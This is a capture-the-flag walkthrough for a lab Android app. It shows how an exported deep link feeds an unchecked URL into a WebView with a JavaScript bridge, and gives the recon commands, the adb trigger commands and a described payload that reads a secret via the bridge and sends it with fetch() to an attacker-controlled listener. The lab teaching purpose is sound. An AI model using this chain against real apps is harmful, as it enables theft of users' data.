# Solve walkthrough — WebView JS-Bridge (Mobile, Medium)

## 0) Recon (static analysis)

```bash
# Pull the APK (adb shell pm path ... && adb pull <path>), then:
jadx -d out/ app-debug.apk

# Find the bridge:
grep -r "JavascriptInterface" out/
grep -r "addJavascriptInterface" out/

# Find the exported deep link and its "url" query param:
grep -r "getQueryParameter" out/
```

This shows `nativeBridge` → `FlagBridge.getSecretFlag()`, and that
`HelpActivity` is `exported="true"` with a `duckurity://help` deep
link whose `url` query param is passed into `loadUrl()` with only a
scheme check (http/https), no host allowlist (check
`AndroidManifest.xml` inside the APK, or the manifest in this repo).

## 1) Exploit — deep link + exfil listener

This is the realistic attacker chain: a victim only has to tap a
link (chat message, QR code, another app) — no adb access to the
victim device required.

### Option A — Docker (matches the OpenLabs lab setup)

```bash
# From the project root, with the APK already built
# (./gradlew assembleDebug):
docker compose up -d --build

# Watch for the flag:
docker compose logs -f flag-listener
```

`docker-compose.yml` brings up two services:
- `flag-listener` (port 8000) — catches the exfiltrated flag and
  prints it.
- `challenge-files` (port 9000) — serves `payload.html` (and the
  built APK) over plain HTTP so the Android device can reach them.

Then trigger the exploit:

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "duckurity://help?url=http://10.0.2.2:9000/solve/payload.html"
```

### Option B — manual, no Docker

```bash
# Terminal 1 — start the catcher:
cd solve && python3 listener.py

# Terminal 2 — host the payload:
cd solve && python3 -m http.server 9000

# Trigger the exploit:
adb shell am start -a android.intent.action.VIEW \
  -d "duckurity://help?url=http://10.0.2.2:9000/payload.html"
```

### What happens

`HelpActivity` reads the `url` query param off the deep link,
accepts it because it's http(s), and loads `payload.html` into the
bridge-attached WebView. `payload.html`'s `onload` handler calls
`nativeBridge.getSecretFlag()` and `fetch()`s it to the listener,
which prints:

```
[+] Received flag: DUCK{w3bv13w_bridg3_tru5t_bound4ry_pwn3d}
```

(`10.0.2.2` is the stock Android emulator's alias for the host
machine; swap it for the attacker host's real IP on a physical
device or the OpenLabs lab network.)
